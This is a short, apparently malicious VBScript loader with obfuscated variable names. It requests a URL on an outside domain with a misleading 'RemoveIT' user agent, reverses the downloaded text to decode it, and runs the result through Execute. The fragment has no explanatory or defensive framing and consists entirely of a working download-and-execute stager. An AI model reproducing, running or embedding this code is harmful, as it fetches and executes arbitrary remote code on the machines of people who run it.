URL="http://dilaingil.info/?c=r&" & HuVDT
set Tcjlf=CreateObject("Microsoft.XMLHTTP")

Tcjlf.open "GET",URL,false
Tcjlf.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
Tcjlf.setRequestHeader "User-Agent", "RemoveIT"
Tcjlf.send "Z"

For i = Len(Tcjlf.responsetext) to 1  Step-1
    var= Mid(Tcjlf.responsetext,  i  , 1)
    n3aje = n3aje & var
Next

execute "Execute n3aje & HuVDTTcjlf"
